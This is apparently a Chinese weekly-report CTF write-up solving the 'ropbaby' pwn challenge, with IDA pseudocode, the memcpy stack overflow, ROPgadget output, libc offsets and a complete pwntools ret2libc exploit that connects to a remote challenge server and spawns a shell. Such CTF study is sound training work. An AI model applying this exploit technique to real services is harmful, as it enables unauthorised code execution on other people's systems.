-
这是12.16更新的bin组的一份报告——关于一道ROP题目的WP
-
**    表示本人最近就只做了一道题目，学的其他东西真的不好写一篇报告，所以对于这道题目写一篇WP，来稍微应付一下这个星期的报告把！！二话不说上题目！！**

*题目的地址呀*[ROPBABY](http://www.shiyanbar.com/ctf/2028)

**对于这样的一道简单的ROP的题目我们还是要按照栈溢出的思路来搞的，因为我们需要通过程序来搞出system函数的地址，然后通过offset搞出libc.so的地址，然后就可以通过ROPgadget搞出ROP组合的地址，还有bin/sh的地址然后用[AAA....]+ROP_addr_ret+system_addr+bin/sh_addr这样的模式开始搞。**


```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v3; // rsi
  const char *v4; // rdi
  signed int v5; // eax
  unsigned __int64 v6; // r14
  int v7; // er13
  size_t v8; // r12
  int v9; // eax
  void *handle; // [rsp+8h] [rbp-448h]
  char nptr[1088]; // [rsp+10h] [rbp-440h]
  __int64 savedregs; // [rsp+450h] [rbp+0h]

  setvbuf(stdout, 0LL, 2, 0LL);
  signal(14, handler);
  alarm(0x3Cu);
  puts("\nWelcome to an easy Return Oriented Programming challenge...");
  puts("Menu:");
  v3 = (_BYTE *)(&dword_0 + 1);
  v4 = "libc.so.6";
  handle = dlopen("libc.so.6", 1);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          sub_BF7(v4, v3);
          if ( !sub_B9A(nptr, 1024LL) )
          {
            puts("Bad choice.");
            return 0LL;
          }
          v3 = 0LL;
          v5 = strtol(nptr, 0LL, 10);
          if ( v5 != 2 )
            break;
          __printf_chk(1LL, "Enter symbol: ");
          v3 = (char *)&dword_40;
          if ( sub_B9A(nptr, 64LL) )
          {
            dlsym(handle, nptr);
            v3 = "Symbol %s: 0x%016llX\n";
            v4 = (_BYTE *)(&dword_0 + 1);
            __printf_chk(1LL, "Symbol %s: 0x%016llX\n");
          }
          else
          {
            v4 = "Bad symbol.";
            puts("Bad symbol.");
          }
        }
        if ( v5 > 2 )
          break;
        if ( v5 != 1 )
          goto LABEL_24;
        v3 = "libc.so.6: 0x%016llX\n";
        v4 = (_BYTE *)(&dword_0 + 1);
        __printf_chk(1LL, "libc.so.6: 0x%016llX\n");
      }
      if ( v5 != 3 )
        break;
      __printf_chk(1LL, "Enter bytes to send (max 1024): ");
      sub_B9A(nptr, 1024LL);
      v3 = 0LL;
      v6 = (signed int)strtol(nptr, 0LL, 10);
      if ( v6 - 1 > 0x3FF )
      {
        v4 = "Invalid amount.";
        puts("Invalid amount.");
      }
      else
      {
        if ( v6 )
        {
          v7 = 0;
          v8 = 0LL;
          while ( 1 )
          {
            v9 = _IO_getc(stdin);
            if ( v9 == -1 )
              break;
            nptr[v8] = v9;
            v8 = ++v7;
            if ( v6 <= v7 )
              goto LABEL_22;
          }
          v8 = v7 + 1;
        }
        else
        {
          v8 = 0LL;
        }
LABEL_22:
        v3 = nptr;
        v4 = (const char *)&savedregs;
        memcpy(&savedregs, nptr, v8);
      }
    }
    if ( v5 == 4 )
      break;
LABEL_24:
    v4 = "Bad choice.";
    puts("Bad choice.");
  }
  dlclose(handle);
  puts("Exiting.");
  return 0LL;
}
```
这个就是我们的ropbaby用IDA PRO反编译过来的伪代码

```
memcpy(&savedregs, nptr, v8);
```
这句话就是溢出点，nptr有1024字节的缓冲区，所以就搞他，有足够的地方搞payload

```
ubuntu@ubuntu:~/Desktop/ropbaby/defcon2015_ropbaby$ ROPgadget --binary libc-2.23.so --only "pop|ret"
Gadgets information
============================================================
0x00000000000dbeb5 : pop qword ptr [rsi - 0x77000000] ; ret 0xd139
0x0000000000115065 : pop r10 ; ret
0x000000000002024f : pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210fb : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000cd6b2 : pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x00000000000202e3 : pop r12 ; pop r13 ; pop r14 ; ret
0x000000000006d125 : pop r12 ; pop r13 ; pop rbp ; ret
0x00000000000206c2 : pop r12 ; pop r13 ; ret
0x00000000000b65d4 : pop r12 ; pop r14 ; ret
0x00000000000398c6 : pop r12 ; pop rbp ; ret
0x000000000001fb12 : pop r12 ; ret
0x0000000000020251 : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210fd : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000cd6b4 : pop r13 ; pop r14 ; pop rbp ; ret
0x00000000000202e5 : pop r13 ; pop r14 ; ret
0x000000000006d127 : pop r13 ; pop rbp ; ret
0x00000000000206c4 : pop r13 ; ret
0x0000000000020253 : pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210ff : pop r14 ; pop r15 ; ret
0x00000000000cd6b6 : pop r14 ; pop rbp ; ret
0x00000000000202e7 : pop r14 ; ret
0x0000000000020255 : pop r15 ; pop rbp ; ret
0x0000000000021101 : pop r15 ; ret
0x000000000001f92e : pop rax ; pop rbx ; pop rbp ; ret
0x0000000000143571 : pop rax ; pop rdx ; pop rbx ; ret
0x0000000000033544 : pop rax ; ret
0x00000000000caabc : pop rax ; ret 0x2f
0x00000000000210fa : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000202e2 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000000206c1 : pop rbp ; pop r12 ; pop r13 ; ret
0x00000000000b65d3 : pop rbp ; pop r12 ; pop r14 ; ret
0x000000000001fb11 : pop rbp ; pop r12 ; ret
0x000000000012cac6 : pop rbp ; pop r13 ; pop r14 ; ret
0x0000000000020252 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210fe : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000000cd6b5 : pop rbp ; pop r14 ; pop rbp ; ret
0x00000000000202e6 : pop rbp ; pop r14 ; ret
0x000000000006d128 : pop rbp ; pop rbp ; ret
0x0000000000048438 : pop rbp ; pop rbx ; ret
0x000000000001f930 : pop rbp ; ret
0x00000000000cd6b1 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret
0x000000000006d124 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x00000000000398c5 : pop rbx ; pop r12 ; pop rbp ; ret
0x00000000000202e1 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00000000000206c0 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000000b65d2 : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret
0x000000000001fb10 : pop rbx ; pop rbp ; pop r12 ; ret
0x000000000012cac5 : pop rbx ; pop rbp ; pop r13 ; pop r14 ; ret
0x000000000001f92f : pop rbx ; pop rbp ; ret
0x000000000002a69a : pop rbx ; ret
0x0000000000001b18 : pop rbx ; ret 0x2a63
0x0000000000185de0 : pop rbx ; ret 0x6f9
0x000000000013cbcf : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000101efb : pop rcx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000000ea66a : pop rcx ; pop rbx ; ret
0x0000000000001b17 : pop rcx ; pop rbx ; ret 0x2a63
0x00000000000d20a3 : pop rcx ; ret
0x0000000000020256 : pop rdi ; pop rbp ; ret
0x0000000000021102 : pop rdi ; ret
0x0000000000067499 : pop rdi ; ret 0xffff
0x0000000000115064 : pop rdx ; pop r10 ; ret
0x0000000000101fbc : pop rdx ; pop rbx ; ret
0x00000000000ea669 : pop rdx ; pop rcx ; pop rbx ; ret
0x0000000000115089 : pop rdx ; pop rsi ; ret
0x0000000000001b92 : pop rdx ; ret
0x0000000000020254 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000021100 : pop rsi ; pop r15 ; ret
0x00000000000cd6b7 : pop rsi ; pop rbp ; ret
0x00000000000202e8 : pop rsi ; ret
0x0000000000101d7b : pop rsi ; ret 0xcdbb
0x0000000000020250 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00000000000210fc : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000000cd6b3 : pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
0x00000000000202e4 : pop rsp ; pop r13 ; pop r14 ;........
```


我们看到了这句就是我们需要的，不要问我为什么，看ctf wiki理解去

```
0x0000000000021102 : pop rdi ; ret

```
这里就是我们要的gadget的偏移地址

然后搞啥 搞bin/sh

```
ubuntu@ubuntu:~/Desktop/ropbaby/defcon2015_ropbaby$ ROPgadget --binary libc-2.23.so --string "bin/sh"
Strings information
============================================================
0x000000000018cd18 : bin/sh

```
我们也搞到了bin/sh的偏移地址了

然后搞system

```
ubuntu@ubuntu:~/Desktop/ropbaby/defcon2015_ropbaby$ objdump -T libc-2.23.so | grep system
00000000001387d0 g    DF .text	0000000000000046  GLIBC_2.2.5 svcerr_systemerr
0000000000045390 g    DF .text	000000000000002d  GLIBC_PRIVATE __libc_system
0000000000045390  w   DF .text	000000000000002d  GLIBC_2.2.5 system

```
我们看到的第三条就是我们要的偏移地址了，我们可以通过程序里面的东西来获得所以就可以写exploit了

exploit：
```
#!/usr/bin/python

from pwn import *
import re 
import os


# ROPgadget : 0x0000000000021102
# bin/sh : 18cd17
# system : 0000000000045390
def rec_addr(buf):
    re_add=re.compile(r"0x([0-9A-Z]{16,16})")
    addr=re_add.findall(buf)
    if addr==None:
          return None
    else :
          return addr[0]

#--------------------------------------
#io = process("./ropbaby")
io=remote('106.2.25.7',8004)
io.recv(1024)

io.sendline('2')
print io.recv(1024)
io.sendline('system')
sys_addr=int(rec_addr(io.recv(1024)),16)
system_offset=0x45390
libc_base=sys_addr-system_offset
binsh_offset=0x18cd17
ret_offset=0x21102
bash_addr=libc_base+binsh_offset
ret_addr=ret_offset+libc_base
print "[*]system address is " + hex(sys_addr)

payload='F'*8
payload+=p64(ret_addr)
payload+=p64(bash_addr)
payload+=p64(sys_addr)

io.sendline('3')
io.sendline('32')
io.recv(1024)
io.sendline(payload)
io.recv(1024)
io.interactive()



```
然后就解决了，完结撒花###*★,°*:.☆(￣▽￣)/$:*.°★* 。###

表示代码都是我搞的 好累哦！！！！
                                              by Edgar